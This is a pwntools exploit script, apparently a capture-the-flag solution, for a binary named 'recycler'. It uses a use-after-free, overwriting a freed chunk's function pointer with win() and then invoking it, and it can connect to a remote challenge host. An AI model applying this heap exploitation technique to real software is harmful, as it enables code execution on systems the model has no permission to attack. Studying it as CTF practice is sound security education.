#!/usr/bin/env python3

from pwn import *

"""
The idea here is the UAF (Use after free), since the pointer to the function (that trig win()) is inside the chunck itself,
We can simple ALLOCATE and then FREE a malloc in order to modify it and put into the fd (forward pointer)which is the action() address
 the address of win().
 Now when we choose "invoke" the win() will be executed


+-----------------------------+
| chunk header                |
+-----------------------------+ <- user pointer 
| fd == action()              |  <- overwritten in win()
+-----------------------------+
| key                         | 
+-----------------------------+
| rest of  payload            |
+-----------------------------+



"""

elf = ELF("./recycler_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.log_level="debug"

def conn():
    if args.REMOTE:
        p = remote("offsec.m0lecon.it", 13505)
        if args.DEBUG:
            gdb.attach()
    else:
        p = process([elf.path])
        

    return p


def main():
    p = conn()

#--------STEP 1: CREATE/FREE A MALLOC THE WHEN IS IN THE T CHACHE WE MODUFY IT---------


    win = elf.sym.win

    #CREATE(index=1)
    p.sendlineafter(b'> ', b'1')   #create malloc
    p.sendlineafter(b'index: ', b'1')
    p.sendafter(b'data: ',b'A') # type: ignore


    #FREE(index=1) now the chucnk is into the tcache list
    p.sendlineafter(b'> ', b'2')    #free malloc
    p.sendlineafter(b'index: ', b'1')
    #gb.attach(p)

    #EDIT(index=1)
    p.sendlineafter(b'> ', b'3') #edit malloc (the ones freeded)
    p.sendlineafter(b'index: ', b'1') # head della lista
    p.recvuntil(b'payload: ')
    p.send(p64(win))  #<-- overwrite the address of action() in win() of the chunck


    #--------STEP 2: TRIGGER THE EXECUTION ---------
    #INVOKE(index=1)
    p.sendlineafter(b'> ', b'4')  
    p.sendlineafter(b'index: ', b'1')                     
    #p.sendafter(b'data: ', p64(win).ljust(32, b'X')) # type: ignore
    #p.sendlineafter(b'> ', b'4')            


    p.interactive()

if __name__ == "__main__":
    main()
